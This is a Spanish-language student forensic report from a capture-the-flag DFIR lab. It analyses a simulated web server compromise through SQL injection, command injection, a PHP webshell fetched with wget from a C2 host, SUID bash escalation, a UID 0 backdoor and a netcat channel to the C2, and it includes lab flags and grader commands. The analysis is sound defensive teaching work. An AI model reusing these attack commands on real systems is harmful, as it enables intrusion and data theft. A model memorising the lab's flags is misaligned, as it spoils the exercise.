# Informe forense — Incidente PhantomCorp (phantomcorp-web)

**Grupo:** 08 · **Investigadores:** Marco Cordoba — @MarcoCordoba · Thomas Koncurat — @Koncu1 · Lucas Leone — @LucasLeone · Geronimo Marquez — @Geromarquezz · Joaquin Moyano — @Joaco919 · **Fecha:** 30/10/2026  
**Sistema afectado:** phantomcorp-web (10.0.0.5) · **Tipo:** intrusión web + ejecución remota de comandos + exfiltración  

---

## 0. Declaración de uso de IA y Plan de Trabajo en 3 Partes

### 0.1 Plan de trabajo del grupo (División en 3 Partes)

Para abordar la investigación forense digital (DFIR) de manera estructurada y colaborativa, el laboratorio se divide en tres fases lógicas:

- **Parte 1 (Aseguramiento de la Evidencia y Vector de Entrada Inicial — Retos R1 y R5):**
  - Verificación formal de la cadena de custodia mediante hashing SHA-256 (`evidencia.sha256`).
  - Detección, aislamiento y análisis de la evidencia alterada en `logs/auth.log` (**Reto R5**).
  - Análisis forense de `logs/access.log`: identificación de la IP atacante (`185.220.101.42`), fases de reconocimiento, bypass SQLi y explotación del vector de entrada RCE en `/api/reporte` (**Reto R1**).
  - Resumen ejecutivo inicial, apertura de la línea de tiempo, tabla preliminar de IOCs y respuesta técnica a la pregunta **P2** (Cadena de custodia).
- **Parte 2 (Artefactos de Disco y Memoria: Webshell, Privesc y Persistencia — Retos R2 y R3):**
  - Análisis de artefactos de disco: detección y defanging de la webshell en `/var/www/uploads/shell.php` (**Reto R2**).
  - Análisis de persistencia en disco: usuario backdoor `phantom-svc` (UID 0) en `/etc/passwd.snippet` y tarea en `/etc/cron.d/phantom-maint`.
  - Análisis de artefactos de memoria volátil (`pslist.txt`, `netstat.txt`, `lsof.txt`, `bash_history.txt`): escalada de privilegios a `root` mediante el binario SUID `/usr/local/bin/system-check -p` (**Reto R3**).
  - Expansión de la línea de tiempo, correlación de procesos e investigación de las preguntas **P1** y **P4**.
- **Parte 3 (C2, Exfiltración, Contención/Erradicación, Timeline Script y Research — Reto R4):**
  - Análisis de la conexión saliente hacia el servidor C2 (`45.13.37.7:4444`) y exfiltración de la base de clientes `/app/priv/clientes.db.txt` (**Reto R4**).
  - Consolidación final de la matriz de IOCs, análisis global del alcance del daño y plan de respuesta para el CSIRT (contención, erradicación y recuperación).
  - Automatización forense con `src/timeline.py`, respuestas **P3** y **P5**, y elaboración del mini-research (`research.md`).

---

### 0.2 Declaración de uso de asistentes de IA

**¿El grupo usó asistentes de IA en este trabajo?** Sí.

| Herramienta | Para qué se usó | Qué partes afectó | Cómo se verificó |
|---|---|---|---|
| Claude (Anthropic), vía Claude Code | Asistencia en la verificación automatizada de hashes de la custodia, decodificación URL de peticiones de log y estructuración inicial del informe forense para la Parte 1. | `informe.md`: Secciones 0, 1, 2, 3 (fases 1–3), tabla de IOCs preliminar, P2 y bitácora. | Las salidas pegadas en la sección 2 provienen de la ejecución real de `sha256sum` sobre el paquete de evidencia. Los registros de `access.log` y `auth.log` se contrastaron directamente contra los archivos provistos. Las flags se validaron con el evaluador `./ctf submit 11`. El grupo comprende la validez procesal de la cadena de custodia y los principios de DFIR aplicados. |
| Claude (Anthropic), vía Claude Code | **Parte 2:** análisis de los artefactos de disco (`shell.php.evidencia.txt`, `passwd.snippet`, `listado.txt`) y de memoria (`pslist`, `netstat`, `lsof`, `bash_history`); redacción de las secciones 3.2–3.3, las filas R2/R3 del timeline, los IOCs de disco/memoria/persistencia, el alcance del daño, P1, P4 y la bitácora de la Parte 2. | `informe.md`: secciones 3.2 y 3.3, filas 02:19–02:22 del timeline, filas de IOCs de la Parte 2, puntos 4–5 del alcance del daño, recomendaciones 5–6, P1, P4 y bitácora (bloque 4). | Las salidas pegadas son las reales de la evidencia de `caso/`. R2 y R3 se validaron por `sha256` contra `retos.manifest` y con `./ctf submit 11`. No se consultó ningún `solucion.md` (no existe en el lab): todo sale de analizar la evidencia provista. |

El grupo declara que comprende el contenido íntegro de lo entregado y que puede explicar y defender oralmente cualquier parte del análisis forense.

---

## 1. Resumen del incidente

Entre las 02:14 y las 02:23 UTC del 5 de septiembre de 2026, el servidor web perimetral de PhantomCorp (`phantomcorp-web`, 10.0.0.5) sufrió un compromiso total por parte de un atacante externo operando desde la dirección IP `185.220.101.42`. 

El actor malicioso realizó reconocimiento automatizado, ejecutó un bypass de autenticación por inyección SQL en `/portal-rrhh/login`, descargó una copia de respaldo desprotegida (`/backup/rrhh.conf`) para sustraer un token de API interno, y logró ejecución remota de comandos (RCE) a través del endpoint `/api/reporte`. 

Desde allí, implantó una webshell en el directorio de subidas, escaló privilegios a nivel `root` abusando de una copia con bit SUID del intérprete bash (`/usr/local/bin/system-check`), estableció persistencia mediante un usuario con UID 0 (`phantom-svc`) y una tarea programada en `cron`, exfiltrando finalmente la base confidencial de clientes (`/app/priv/clientes.db.txt`) hacia un servidor de Comando y Control (C2) externo (`45.13.37.7`). Además, el atacante intentó borrar sus huellas alterando el registro de autenticación `auth.log` y ejecutando `history -c`.

---

## 2. Cadena de custodia y verificación de integridad

Como estándar forense ineludible (Principio de Intercambio de Locard y RFC 3227), la evidencia debe permanecer inmutable desde el instante de su adquisición. Cualquier modificación no autorizada o discrepancia en las sumas de verificación invalida su valor probatorio tanto en auditorías internas como en sede judicial.

### 2.1 Verificación de integridad con `sha256sum`

Nos posicionamos en el directorio `caso/` y cotejamos cada elemento del paquete de evidencia contra el archivo de firmas original `evidencia.sha256`:

```
$ cd labs/lab11-forensia/caso
$ sha256sum -c evidencia.sha256
disco/etc/passwd.snippet: OK
disco/listado.txt: OK
disco/var/www/uploads/shell.php.evidencia.txt: OK
logs/access.log: OK
logs/auth.log: FAILED
memoria/bash_history.txt: OK
memoria/lsof.txt: OK
memoria/netstat.txt: OK
memoria/pslist.txt: OK
sha256sum: WARNING: 1 computed checksum did NOT match
```

### 2.2 Hallazgo y análisis del tampering (Reto R5)

Ocho de los nueve archivos preservan su integridad criptográfica estricta. Sin embargo, el archivo `logs/auth.log` arrojó estado **FAILED**.

Al inspeccionar detalladamente el archivo alterado, observamos que fue manipulado intencionalmente para suprimir registros de auditoría entre las 02:21 y las 02:45 UTC. El equipo de respuesta inicial logró rescatar los metadatos y el marcador original directamente desde el almacenamiento volátil del journal del sistema:

```
$ cat logs/auth.log
# auth.log  ·  phantomcorp-web  ·  OJO: este archivo parece haber sido tocado.
Sep  5 02:19:55 phantomcorp-web sshd[1201]: Accepted password for www-data from 185.220.101.42
Sep  5 02:20:31 phantomcorp-web sudo:  www-data : command not allowed ; TTY=pts/0 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
Sep  5 02:21:04 phantomcorp-web kernel: [ 8823.11] audit: SUID exec /usr/local/bin/system-check uid=33 euid=0
# --- lineas eliminadas por el atacante ---
# nota del forense: el hash de este archivo NO coincide con el de la custodia.
# alguien lo edito despues de la captura. marcador recuperado del journal:
# FLAG{dfir_custodia_alterada}
Sep  5 02:45:00 phantomcorp-web sshd[1440]: Connection closed by 185.220.101.42
```

- **Flag capturada (R5):** `FLAG{dfir_custodia_alterada}`
- **Implicancia forense:** La alteración demuestra un intento activo de antiforensia (*log cleaning*) para ocultar la actividad post-explotación. En un dictamen judicial, este archivo individual no puede presentarse como evidencia pura de disco; no obstante, la correlación con los volcados de memoria y el journal de systemd permitió reconstruir la verdad de los hechos sin perder trazabilidad.

---

## 3. Línea de tiempo del ataque (Fases analizadas en la Parte 1)

A partir del análisis exhaustivo de `logs/access.log`, reconstruimos el inicio de la intrusión:

| Hora (UTC) | Fase | Evento detectado | Evidencia concreta (Archivo:Línea) |
|---|---|---|---|
| **02:14:03** | Reconocimiento | Escaneo de cabeceras HTTP desde IP atacante `185.220.101.42` utilizando User-Agent `Mozilla/5.0 zgrab/0.x`. | `logs/access.log:1` |
| **02:14:19** | Enumeración | Fuerza bruta de directorios web mediante `gobuster/3.6`. Petición a `/robots.txt` (200 OK, 64 bytes). | `logs/access.log:2` |
| **02:14:20** | Enumeración | Gobuster prueba `/admin` y `/login` recibiendo respuestas 404. | `logs/access.log:3-4` |
| **02:14:21** | Enumeración | Gobuster descubre `/backup` (redirección 301) y `/portal-rrhh` (200 OK, 402 bytes). | `logs/access.log:5-6` |
| **02:14:22** | Enumeración | Gobuster descubre el directorio de subidas `/uploads` (301). | `logs/access.log:7` |
| **02:16:40** | Intrusión inicial | Intento manual de login con credenciales incorrectas en `/portal-rrhh/login` usando `curl/8.5` (401 Unauthorized). | `logs/access.log:8` |
| **02:16:58** | Intrusión inicial | Segundo intento de autenticación fallido en `/portal-rrhh/login` (401). | `logs/access.log:9` |
| **02:17:22** | Explotación (SQLi) | **Bypass de autenticación exitoso:** Inyección SQL con payload `user=admin'--` en `/portal-rrhh/login`. Servidor devuelve 200 OK (180 bytes). | `logs/access.log:10` |
| **02:17:41** | Fuga de información | Descarga no autorizada del archivo de configuración `/backup/rrhh.conf` (200 OK, 210 bytes), donde obtiene el token de API `phantom-api-7c1e`. | `logs/access.log:11` |
| **02:18:10** | Explotación (RCE) | Prueba de inyección de comandos en `/api/reporte?token=phantom-api-7c1e&cmd=id`. Servidor ejecuta `id` como `www-data` (200 OK). | `logs/access.log:12` |
| **02:18:33** | Explotación (RCE) | **Vector de entrada crítico (Reto R1):** Inyección de comando con marcador URL-encodeado: `cmd=echo%20FLAG%7Bdfir_vector_sqli%7D%20%3E%20/tmp/.p`. El comando escribe en `/tmp/.p`. | `logs/access.log:13` |
| **02:19:02** | Dropeo de webshell | El atacante usa el RCE para bajar un webshell desde el C2: `wget http://45.13.37.7/s.php -O /var/www/uploads/shell.php`. Queda `shell.php` (431 bytes) en el disco. | `logs/access.log:14` · `disco/listado.txt` |
| **02:19:48** | Uso de webshell | Interacción con la webshell ya instalada: `GET /uploads/shell.php?c=whoami` (RCE persistente vía parámetro `?c=`). | `logs/access.log:15` |
| **02:21:04** | Escalada a root (SUID) | Ejecución de la copia SUID de bash `/usr/local/bin/system-check -p -c 'id'`: el proceso corre con `euid=0`. | `logs/auth.log:4` · `memoria/bash_history.txt:5` · `memoria/pslist.txt` (PID 1477) |
| **02:22:00** | Persistencia | Alta de la tarea `cron` `/etc/cron.d/phantom-maint` (relanza el webshell cada 5 min) y del usuario backdoor `phantom-svc` (UID 0). | `disco/listado.txt` · `disco/etc/passwd.snippet` |
| *02:23:15* | *Exfiltración C2* | *(Parte 3) Robo de base confidencial `/app/priv/clientes.db.txt` y subida a C2 `45.13.37.7`* | `memoria/bash_history.txt:8-9` |

### 3.1 Análisis detallado del Vector de Entrada RCE (Reto R1)

En la línea 13 de `logs/access.log`, se observa la siguiente solicitud HTTP:

```
185.220.101.42 - - [05/Sep/2026:02:18:33 +0000] "GET /api/reporte?token=phantom-api-7c1e&cmd=echo%20FLAG%7Bdfir_vector_sqli%7D%20%3E%20/tmp/.p HTTP/1.1" 200 12 "-" "curl/8.5"
```

El parámetro `cmd` viaja codificado en formato de porcentaje (*URL-encoded*). Al decodificar la cadena:
- `%20` $\rightarrow$ espacio
- `%7B` $\rightarrow$ `{`
- `%7D` $\rightarrow$ `}`
- `%3E` $\rightarrow$ `>`

El comando real inyectado y ejecutado por el servidor web fue:
```bash
echo FLAG{dfir_vector_sqli} > /tmp/.p
```

Esto confirma la existencia de un fallo de **Inyección de Comandos (CWE-78)** en el endpoint administrativo `/api/reporte`, habilitado tras sustraer el token en el backup expuesto.

- **Flag capturada (R1):** `FLAG{dfir_vector_sqli}`

### 3.2 Artefactos de disco — webshell (Reto R2) y persistencia

**Webshell.** En `disco/var/www/uploads/shell.php.evidencia.txt` está la captura (defangeada) del archivo que el atacante dropeó a las 02:19:

```
<?php
// webshell dropeada por el atacante (wget desde 45.13.37.7)
// FLAG{dfir_webshell_hallado}
if (isset($_GET['c'])) { sys'tem($_GET['c']); }   // <- RCE via ?c= (defangeado)
// persistencia: se relanza por cron cada 5 min (ver /etc/cron.d/phantom-maint)
?>
```

Es un webshell PHP mínimo: ejecuta cualquier comando que llegue por el parámetro `?c=` con los privilegios del proceso web. El contenido está **defangeado** (`sys'tem` con una comilla insertada) para manejo forense seguro — no se reconstruye ni se ejecuta. El comentario confirma que llegó por `wget` desde el C2 `45.13.37.7` y que se relanza por `cron`.

- **Flag capturada (R2):** `FLAG{dfir_webshell_hallado}`

**Persistencia en disco.** Dos mecanismos complementarios:

- `disco/etc/passwd.snippet` muestra una cuenta agregada por el atacante: `phantom-svc:x:0:0:service::/root:/bin/bash`. Tiene **UID 0** (equivalente a root) y shell interactiva: es un backdoor de acceso con privilegios administrativos totales.
- `disco/listado.txt` (archivos creados tras el inicio del ataque) lista `/etc/cron.d/phantom-maint` (02:22) como tarea de persistencia que relanza el webshell cada 5 minutos, y `/usr/local/bin/system-check` (1.1 MB, copia SUID de bash) creado 02:21.

### 3.3 Artefactos de memoria — escalada SUID (Reto R3) y correlación

El `.bash_history` del disco fue borrado por el atacante (`history -c`), pero el del proceso vivo se recuperó de la RAM (`memoria/bash_history.txt`). La secuencia de escalada:

```
find / -perm -4000 -type f 2>/dev/null          # enumera binarios SUID
/usr/local/bin/system-check -p -c 'id'           # abusa del SUID -> euid=0
echo FLAG{dfir_privesc_suid}
```

El atacante enumeró los binarios con bit SUID, encontró `/usr/local/bin/system-check` (una copia de bash con SUID root) y lo ejecutó con `-p` (preserva privilegios), obteniendo una shell con `euid=0`. La escalada se corrobora en **tres fuentes independientes** (correlación forense):

- **Log:** `auth.log` 02:21:04 → `audit: SUID exec /usr/local/bin/system-check uid=33 euid=0`.
- **Memoria (`pslist`):** PID 1477 `system-check` corriendo como `root`, hijo del `bash` del atacante (PID 1240), que desciende del `wget` inicial (PID 1201, `www-data`).
- **Disco (`listado.txt`):** el binario SUID `system-check` figura creado a las 02:21.

- **Flag capturada (R3):** `FLAG{dfir_privesc_suid}`

**Correlación de procesos y red.** El árbol de `pslist` cierra la cadena: `nginx worker (www-data)` → `wget` (descarga del webshell) → `bash` (shell interactiva) → `system-check` (root) → `nc 45.13.37.7 4444`. El `netstat` confirma una conexión saliente **ESTABLISHED** a `45.13.37.7:4444` (el C2) desde el PID 1490 (`nc`), y el `lsof` muestra ese mismo `nc` sosteniendo el socket y el `bash` con `/tmp/.exfil/clientes.tar.gz` abierto. La conexión al C2 seguía **viva en memoria** al momento de la captura (02:30 UTC): el atacante **probablemente seguía dentro**. El detalle de la exfiltración (Reto R4) se analiza en la Parte 3.

---

## 4. Indicadores de compromiso (IOCs preliminares — Parte 1)

A partir de los artefactos examinados en la primera fase de la investigación, se consolidan los siguientes Indicadores de Compromiso:

| Tipo de Indicador | Valor / Patrón | Contexto de Detección | Nivel de Confianza |
|---|---|---|---|
| **Dirección IP** | `185.220.101.42` | Origen de todas las conexiones ofensivas (escaneo, login SQLi, RCE, SSH). | Alto (Confirmado en logs de acceso y autenticación). |
| **User-Agent Malicioso** | `Mozilla/5.0 zgrab/0.x` | Reconocimiento inicial automatizado de banner. | Alto |
| **User-Agent Malicioso** | `gobuster/3.6` | Enumeración de fuerza bruta de rutas web. | Alto |
| **Endpoint Vulnerable** | `POST /portal-rrhh/login` | Vector vulnerable a inyección SQL (`user=admin'--`). | Crítico |
| **Endpoint Vulnerable** | `GET /api/reporte` | Vector vulnerable a inyección de comandos en parámetro `cmd`. | Crítico |
| **Ruta Expuesta** | `/backup/rrhh.conf` | Fuga de información sensible y tokens de API internos. | Alto |
| **Archivo Creado (RCE)** | `/tmp/.p` | Archivo temporal de prueba dropeado a las 02:18 UTC por el RCE. | Alto (Correlacionado en `disco/listado.txt`). |
| **Archivo Alterado** | `logs/auth.log` | Registro de autenticación del sistema adulterado tras la captura. | Crítico (Discrepancia en cadena de custodia). |
| **IP Servidor C2** | `45.13.37.7` | Origen del webshell (`wget`) y destino de la conexión saliente `nc` a puerto 4444. | Alto (`pslist`/`netstat`/`lsof`). Volumen de exfiltración se cierra en Parte 3. |
| **Puerto C2** | `45.13.37.7:4444` | Canal de reverse shell (`nc`) ESTABLISHED desde el host comprometido. | Alto (`netstat`/`lsof`). |
| **Ruta Webshell** | `/var/www/uploads/shell.php` | Puerta trasera web (RCE vía `?c=`), dropeada a las 02:19. | Alto (disco + `access.log:14`). |
| **Usuario Backdoor** | `phantom-svc` (UID 0) | Cuenta administrativa no autorizada agregada a `/etc/passwd`. | Crítico (`disco/etc/passwd.snippet`). |
| **Tarea de persistencia** | `/etc/cron.d/phantom-maint` | Cron que relanza el webshell cada 5 minutos. | Alto (`disco/listado.txt`). |
| **Binario SUID malicioso** | `/usr/local/bin/system-check` | Copia de bash con bit SUID root, usada para escalar a `euid=0`. | Crítico (`listado.txt` + `auth.log` + `pslist`). |
| **Archivo de exfiltración** | `/tmp/.exfil/clientes.tar.gz` | Datos empaquetados para el robo (48 KB). | Alto (`listado.txt` + `lsof`). |

---

## 5. Alcance del daño (Evaluación preliminar)

1. **Compromiso del perímetro web:** El atacante logró evadir la autenticación de la aplicación y ejecutar comandos del sistema operativo como el usuario del servidor web (`www-data`).
2. **Acceso a credenciales internas:** Se produjo la exposición no autorizada de archivos de respaldo (`/backup/rrhh.conf`), filtrando claves de servicio.
3. **Manipulación de evidencia:** Se constató la modificación deliberada de archivos del sistema (`auth.log`) para entorpecer la labor pericial.
4. **Escalada a root:** el atacante obtuvo privilegios máximos (`euid=0`) abusando del binario SUID `system-check`, por lo que el compromiso es total a nivel de sistema operativo, no solo del servicio web.
5. **Persistencia establecida (el atacante probablemente sigue adentro):** se implantó un usuario backdoor con UID 0 (`phantom-svc`), una tarea `cron` que relanza el webshell cada 5 minutos (`/etc/cron.d/phantom-maint`) y un binario SUID root. En memoria, la conexión al C2 (`45.13.37.7:4444`) seguía ESTABLISHED al momento de la captura.
6. *(Pendiente de cuantificación final en Parte 3: volumen exacto de registros de clientes exfiltrados hacia el C2 — Reto R4.)*

---

## 6. Recomendaciones iniciales de contención y erradicación

Con los hallazgos de la Parte 1, el equipo de respuesta a incidentes (CSIRT) debe activar de forma inmediata:

1. **Aislamiento en red del host comprometido:** Desconectar la interfaz de red de `phantomcorp-web` (10.0.0.5) para frenar cualquier tráfico saliente hacia la infraestructura del atacante.
2. **Bloqueo perimetral en firewall / WAF:** Bloquear de inmediato la dirección IP de origen `185.220.101.42` y la IP del servidor de descarga `45.13.37.7`.
3. **Parcheo de vulnerabilidades web:**
   - Deshabilitar el endpoint `/api/reporte` hasta implementar parametrización estricta que impida la invocación de la shell del sistema.
   - Corregir el formulario `/portal-rrhh/login` sustituyendo la concatenación de cadenas por consultas preparadas (*prepared statements*).
   - Eliminar el directorio público `/backup` y restringir el listado de archivos.
4. **Revocación de credenciales:** Invalidar el token `phantom-api-7c1e` de forma inmediata en todos los microservicios internos.
5. **Erradicación de la persistencia (hallazgos Parte 2):** eliminar el usuario `phantom-svc` de `/etc/passwd`, borrar la tarea `/etc/cron.d/phantom-maint` y el webshell `/var/www/uploads/shell.php`, y quitar el bit SUID (o remover) el binario `/usr/local/bin/system-check`.
6. **Matar el proceso y cortar el C2:** terminar los procesos del atacante (`nc` PID 1490 y `bash` PID 1240) y cerrar la conexión saliente a `45.13.37.7:4444`. Dado que la sesión seguía viva, la contención en red es urgente.

---

## 7. Preguntas de análisis

**P1 — ¿Por qué la RAM se captura antes que el disco? Dá un ejemplo de este caso donde la memoria tenía algo que el disco ya no.**

La RAM se captura primero por el **orden de volatilidad** (RFC 3227): es la fuente que se destruye más rápido — se pierde apenas se apaga o reinicia la máquina —, mientras que el disco y los logs persisten. Si uno apagara el equipo "para analizarlo con calma", perdería para siempre los procesos en ejecución, las conexiones de red abiertas y los datos que solo viven en memoria. Por eso el procedimiento es: primero el volcado de RAM, después la imagen de disco.

Ejemplo concreto de este caso: el atacante corrió `history -c` y borró el `.bash_history` del disco, pero sus comandos seguían en la memoria del proceso `bash` todavía vivo y se recuperaron de ahí (`memoria/bash_history.txt`). Lo mismo con el canal C2: `netstat`/`lsof` de memoria muestran el `nc` con el socket a `45.13.37.7:4444` **ESTABLISHED** (PID 1490), una conexión de la que en el disco no queda ningún rastro. La RAM tenía lo que el disco ya no.

**P2 — El R5: ¿cómo supiste que el archivo fue alterado? ¿Por qué eso invalida la evidencia si no se documenta?**

La alteración se detectó matemáticamente a través de la **verificación de la cadena de custodia**. Al ingresar al caso, se comparó el hash criptográfico actual de cada archivo contra la tabla de control generada durante la captura forense inicial (`evidencia.sha256`). Mientras que los demás archivos arrojaron `OK`, `logs/auth.log` falló la verificación (`FAILED`). Dado que las funciones de dispersión criptográfica como SHA-256 poseen la propiedad de **resistencia a colisiones** y efecto avalancha (cualquier cambio mínimo de un solo bit en el archivo produce un hash radicalmente distinto), el mismatch constituyó la certeza irrefutable de que el contenido del archivo fue modificado con posterioridad a la fijación de la escena del crimen digital.

**Por qué invalida la evidencia si no se documenta:**

En el derecho procesal y en los estándares internacionales de informática forense (ISO/IEC 27037 y RFC 3227), la **cadena de custodia** es la garantía formal de que la prueba presentada ante un tribunal o auditoría es exactamente la misma que se recolectó, manteniéndose íntegra, inalterada y trazable en todo momento.

Si un perito o equipo de respuesta presenta un archivo cuyo hash no coincide con el acta de recolección y no documenta exhaustivamente qué ocurrió:
1. **Pérdida de autenticidad:** La defensa del atacante o el auditor legal puede argumentar con fundamento que la evidencia fue "plantada", manipulada por administradores negligentes o corrompida por terceros, destruyendo la presunción de veracidad de todo el caso.
2. **Inadmisibilidad judicial:** La prueba es declarada nula (*fruto del árbol envenenado*), imposibilitando cualquier acción penal contra el intruso o el reclamo ante aseguradoras de ciberriesgo.
3. **El valor de documentar el hallazgo:** Paradójicamente, si el perito documenta formalmente la discrepancia, preserva el archivo original modificado y recurre a fuentes redundantes corroborables (como el volcado de memoria no volátil, journals del kernel o registros centralizados en un SIEM inmutable), la alteración deja de ser un problema procesal y **se transforma en una prueba acusatoria adicional**: demuestra la premeditación y las acciones de antiforensia del atacante para borrar sus rastros.

**P3 — Correlacioná tres artefactos (log + disco + memoria) que apunten al MISMO evento con el mismo timestamp.**

*(pendiente — parte del compañero que realice la Parte 3)*

**P4 — El atacante corrió `history -c`. ¿Por qué igual pudiste recuperar sus comandos?**

`history -c` borra la lista de historial **de la sesión en curso** y, al cerrar la shell, el archivo `~/.bash_history` en disco. Pero no toca la **memoria del proceso `bash` que sigue vivo**: mientras esa shell no termina, su historial (y su estado) permanecen en la RAM del proceso. La captura de memoria se tomó con la sesión todavía activa (02:30 UTC, con el `bash` PID 1240 y el `nc` al C2 corriendo), así que el historial se extrajo del volcado de RAM — en producción, `volatility3 -f dump.raw linux.bash` — aunque en el disco ya no estuviera. Es, de nuevo, el orden de volatilidad jugando a favor del forense: el atacante limpió la fuente persistente, pero no podía limpiar la volátil sin matar su propia sesión.

**P5 — Cierre del curso: recorriste ataque, agentes, defensa y forensia. ¿Por qué un buen forense tiene que entender cómo ataca un pentester?**

*(pendiente — parte del compañero que realice la Parte 3)*

---

## 8. Bitácora de comandos forenses (Partes 1 y 2)

```bash
# ==============================================================================
# 1. Verificación de la cadena de custodia
# ==============================================================================
cd labs/lab11-forensia/caso
sha256sum -c evidencia.sha256
# Resultado: logs/auth.log -> FAILED

# Inspección de la alteración en auth.log (Reto R5)
grep -E 'FAILED|alterad|marcador|FLAG' logs/auth.log
# Hallazgo: FLAG{dfir_custodia_alterada}

# ==============================================================================
# 2. Análisis del log de acceso web (logs/access.log)
# ==============================================================================
# Identificación de la IP recurrente del atacante
cut -d' ' -f1 logs/access.log | sort | uniq -c | sort -nr
# Hallazgo: 185.220.101.42 (16 peticiones concentradas)

# Reconstrucción de peticiones de la IP atacante
grep "185.220.101.42" logs/access.log

# Detección del vector de entrada RCE (Reto R1)
grep "cmd=" logs/access.log
# Petición: GET /api/reporte?token=phantom-api-7c1e&cmd=echo%20FLAG%7Bdfir_vector_sqli%7D%20%3E%20/tmp/.p HTTP/1.1
# Decodificación URL: echo FLAG{dfir_vector_sqli} > /tmp/.p

# ==============================================================================
# 3. Validación de flags en el motor CTF
# ==============================================================================
./ctf submit 11 R1 'FLAG{dfir_vector_sqli}'
./ctf submit 11 R5 'FLAG{dfir_custodia_alterada}'

# ==============================================================================
# 4. Parte 2 — Artefactos de disco y memoria (R2, R3)
# ==============================================================================
# Webshell en disco (Reto R2)
cat disco/var/www/uploads/shell.php.evidencia.txt
# Hallazgo: FLAG{dfir_webshell_hallado}  (RCE via ?c=, dropeado por wget desde 45.13.37.7)

# Persistencia en disco
cat disco/etc/passwd.snippet                       # usuario backdoor phantom-svc (UID 0)
grep -nE 'cron|system-check|shell.php' disco/listado.txt   # cron + binario SUID + webshell

# Escalada SUID — historial recuperado de memoria (Reto R3)
cat memoria/bash_history.txt                        # el .bash_history del disco se borró (history -c)
# Hallazgo: /usr/local/bin/system-check -p -c 'id'  ->  FLAG{dfir_privesc_suid}

# Correlación de procesos y red (memoria)
cat memoria/pslist.txt                              # wget -> bash -> system-check(root) -> nc C2
cat memoria/netstat.txt                             # ESTABLISHED a 45.13.37.7:4444 (C2)
cat memoria/lsof.txt                                # nc con el socket C2; bash con clientes.tar.gz

./ctf submit 11 R2 'FLAG{dfir_webshell_hallado}'
./ctf submit 11 R3 'FLAG{dfir_privesc_suid}'
./ctf status 11
```
